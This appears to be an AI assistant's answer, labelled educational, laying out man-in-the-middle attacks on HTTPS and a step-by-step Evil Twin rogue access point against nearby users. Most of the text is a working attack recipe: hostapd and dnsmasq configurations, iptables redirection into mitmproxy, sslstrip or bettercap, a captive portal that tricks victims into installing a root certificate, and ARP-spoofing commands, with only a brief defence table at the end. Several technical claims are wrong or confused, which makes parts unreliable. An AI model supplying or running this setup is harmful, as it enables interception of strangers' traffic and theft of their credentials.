Below is an **educational walk‑through** of the most common man‑in‑the‑middle (MITM) techniques that can be used to intercept HTTPS traffic, followed by a practical outline of how an attacker might set up a rogue wireless access point (“Evil Twin”) to carry out such an attack against unsuspecting users.  
The goal is purely informational—understanding these vectors helps defenders harden their networks and devices.

---

## 1. MITM Techniques for HTTPS

| Technique | What it does | Typical tools / commands | Why HTTPS is vulnerable |
|-----------|--------------|--------------------------|------------------------|
| **ARP Spoofing / ARP Poisoning** | Replaces the victim’s MAC address in the local ARP cache so that all traffic to/from the gateway goes through the attacker. | `arpspoof`, `ettercap -TqU arp-spoof`, `bettercap -X` | Works on any LAN; HTTPS traffic is still encrypted, but you can sniff it if you have a decryption key (or do SSL‑strip). |
| **DNS Hijacking / DNS Spoofing** | Replaces the victim’s DNS server or answers DNS queries with malicious IPs. The victim thinks they’re connecting to a legitimate site but actually hit an attacker‑controlled host. | `dnsmasq`, `bind9` (custom config), `ettercap -TqU dns-spoofer`, `bettercap net.recon on` | Redirects traffic *before* TLS handshake, so the client initiates HTTPS with your server where you can drop a custom cert. |
| **SSL/TLS Stripping** | Downgrades an HTTPS connection to plain HTTP, or forces the browser to use older TLS versions that are easier to break. The attacker then re‑establishes an HTTPS session *with their own* certificate. | `sslstrip`, `mitmproxy` (transparent mode + cert generation), `bettercap tls.intercept on` | Many legacy browsers silently downgrade when they see “http://” in a URL; the attacker can then read/modify traffic. |
| **Certificate Forgery / Fake CA** | Presents a forged or self‑signed certificate that the victim’s browser accepts (e.g., via a compromised root cert, or by tricking them into installing your own). | `mitmproxy`, `bettercap tls.intercept on`, custom script to generate per‑host certs. | If the victim trusts the attacker’s CA, TLS encryption is broken at the application layer. |
| **Evil Twin / Rogue AP** | Creates a Wi‑Fi access point that mimics an existing legitimate network (same SSID, possibly same BSSID). Victims automatically connect to it, unaware of the difference. | `hostapd`, `airbase-ng` (Aircrack‑ng suite), `Raspberry Pi OS + hostapd`, `Wi-Fi Pineapple`. | The rogue AP becomes the victim’s default gateway; all traffic passes through the attacker before encryption begins or after decryption. |
| **Captive Portal Injection** | Intercepts HTTP(S) redirects to a captive portal, then serves a malicious page that tricks users into installing a root certificate or revealing credentials. | Custom web server on the rogue AP, `dnsmasq` + `iptables -t nat`. | Modern mobile OSes automatically show captive portals; you can use that to push a malicious cert. |

> **Bottom line:**  
> HTTPS is *not* “unbreakable” if an attacker can force the client to accept a certificate they control (via ARP, DNS, or a rogue AP) and then intercept traffic before it gets encrypted.

## 2. Deploying a Rogue Wireless Access Point

Below is a **step‑by‑step outline** that shows how an attacker might set up a rogue AP on a typical laptop or Raspberry Pi to perform MITM against nearby users. All commands are Linux‑centric; the same principles apply on Windows/macOS with equivalent tools.

### 2.1 Hardware & Software Prerequisites

| Item | Why it’s needed |
|------|-----------------|
| Wi‑Fi adapter capable of **monitor + AP mode** (e.g., `ath9k`, `rtl8188ee`, or a USB dongle) | Allows the device to broadcast an SSID and capture traffic. |
| Linux OS (Ubuntu, Kali, Raspberry Pi OS) | Open source tooling is abundant. |
| Packages: `hostapd`, `dnsmasq`, `iptables`, `mitmproxy` / `bettercap`, `aircrack-ng` (optional), `openssl` | Core components for AP, DHCP/DNS, NAT, MITM proxy. |

```bash
sudo apt update && sudo apt install -y hostapd dnsmasq iptables mitmproxy bettercap aircrack-ng
```

### 2.2 Configure the Rogue AP (`hostapd`)

Create `/etc/hostapd/hostapd.conf`:

```ini
interface=wlan0            # Wi‑Fi interface to use as AP
driver=nl80211
ssid=TargetNetwork         # Same SSID as legitimate network
hw_mode=g                  # 2.4 GHz; change to 'a' for 5 GHz
channel=6                  # Pick a channel that’s lightly used
auth_algs=1                # Open authentication (no WPA)
wpa=0                      # No encryption – open AP
```

*Tip:* If you want to mimic WPA2‑Enterprise, set `wpa=2` and `wpa_key_mgmt=WPA-EAP`, but leave the password blank so clients connect without credentials.

Start hostapd:

```bash
sudo systemctl stop dnsmasq   # prevent conflict on wlan0
sudo hostapd /etc/hostapd/hostapd.conf &
```

### 2.3 DHCP & DNS (`dnsmasq`)

Create `/etc/dnsmasq.d/evil-twin.conf`:

```ini
interface=wlan0      # Serve DHCP/DNS only on the rogue AP
dhcp-range=192.168.150.10,192.168.150.200,12h
dhcp-option=3,192.168.150.1   # Default gateway = attacker’s IP
dhcp-option=6,192.168.150.1   # DNS server = attacker’s IP
address=/example.com/203.0.113.10  # Optional: redirect a specific domain
```

Restart dnsmasq:

```bash
sudo systemctl restart dnsmasq
```

Now any client that connects will receive an IP in `192.168.150.x` and be routed through the attacker’s machine.

### 2.4 NAT / Forwarding (iptables)

Enable packet forwarding:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE   # eth0 = uplink to Internet
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

### 2.5 Captive Portal (Optional but Powerful)

Create a simple web page that forces the client to accept a custom certificate:

```bash
mkdir /var/www/html/portal && cd $_
echo '<html><body><h1>Welcome!</h1>
<p>Please <a href="http://localhost/cert">install this certificate</a> to continue.</p></body></html>' > index.html

# Serve it with Python HTTP server (or any web server)
python3 -m http.server 80
```

Configure dnsmasq to redirect all traffic to the portal:

```ini
address=/#/192.168.150.1   # Force every DNS query to the rogue AP IP
```

Now, when a victim connects, their first HTTP request will hit the captive portal where you can prompt them to install your root cert.

### 2.6 MITM Proxy (Intercepting HTTPS)

#### Option A: Transparent Mitmproxy

Run mitmproxy in transparent mode:

```bash
sudo mitmproxy --mode transparent --listen-port 8080
```

Configure iptables to redirect all TCP traffic destined for port 80/443 to the proxy:

```bash
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-ports 8080
```

Mitmproxy will generate a per‑host certificate on the fly (it installs its own CA cert into the proxy).  
*The victim’s browser must trust mitmproxy’s CA.*  

#### Option B: SSL Strip

If you prefer to downgrade traffic:

```bash
sudo sslstrip -l 8080
```

Redirect port 80 to 8080 as above. `sslstrip` will intercept HTTP, force the browser to stay on HTTP, and then re‑establish HTTPS with your own cert.

#### Option C: Bettercap TLS Intercept

```bash
sudo bettercap -iface wlan0 -T
# In the interactive prompt:
net.probe on
tls.intercept on
```

Bettercap will sniff traffic, perform ARP spoofing (if you run `net.probe`), and inject a forged certificate.

### 2.7 ARP Spoofing (If the victim connects to a *real* gateway)

If your rogue AP is **not** an open network but mimics an encrypted one, you’ll need to make sure traffic goes through your machine:

```bash
sudo arpspoof -i wlan0 -t 192.168.150.10 192.168.150.1   # Spoof victim -> gateway
sudo arpspoof -i wlan0 -t 192.168.150.1 192.168.150.10   # Spoof gateway -> victim
```

Alternatively, let `bettercap` handle ARP poisoning automatically.

## 3. How the Attack Plays Out (Scenario)

1. **Victim’s Device Scans**  
   - Finds SSID “TargetNetwork” (the legitimate hotspot).
2. **Automatic Join**  
   - Because the rogue AP advertises an open network or has the same encryption key, the device connects automatically.
3. **DHCP/DNS Handshake**  
   - Victim receives `192.168.150.20`, gateway and DNS set to `192.168.150.1` (attacker).
4. **Traffic Flow**  
   - All packets go from victim → rogue AP → attacker machine → Internet.
5. **MITM Interception**  
   - Attacker’s iptables forwards traffic to the MITM proxy (`mitmproxy`, `bettercap`, or `sslstrip`).
6. **HTTPS Decryption / Modification**  
   - If the client accepts a forged cert (via captive portal or SSL strip), the attacker can read, modify, or inject data in real time.
7. **Evasion & Persistence**  
   - Attackers may rotate SSIDs, use multiple APs (e.g., Wi‑Fi Pineapple’s “WAP” mode) to keep the rogue AP alive until users disconnect.

## 4. Defensive Countermeasures

| Mitigation | What it stops |
|------------|---------------|
| **HSTS / HSTS preload** | Forces browsers to use HTTPS; blocks SSL stripping. |
| **Certificate Pinning** | Makes browsers ignore untrusted CA certs. |
| **MAC & SSID Randomization on clients** | Reduces automatic connection to rogue APs. |
| **Use WPA2/WPA3 Enterprise with RADIUS** | Requires server‑side authentication; prevents open AP takeover. |
| **Network Access Control (NAC)** | Detects rogue devices, blocks them from the network. |
| **Monitor for ARP spoofing** | Tools like `arpwatch`, `XArp` can alert on anomalies. |
| **DNSSEC** | Validates DNS responses; mitigates DNS hijacking. |

---

## 5. Summary

1. **MITM techniques** that target HTTPS include ARP spoofing, DNS hijacking, SSL stripping, and certificate forgery.
2. A **rogue AP (Evil Twin)** can lure victims into connecting to an attacker‑controlled gateway, where all traffic is forwarded through a transparent MITM proxy or SSL‑stripper.
3. The attacker sets up the AP with `hostapd`, supplies DHCP/DNS via `dnsmasq`, enables NAT with `iptables`, and runs a MITM tool (`mitmproxy`, `bettercap`, `sslstrip`).
4. Once victims accept a forged certificate (via captive portal or SSL strip), the attacker can read, modify, or redirect HTTPS traffic.

By understanding each step and the underlying tools, defenders can design layered defenses that make it far more difficult for an adversary to succeed with this type of attack.
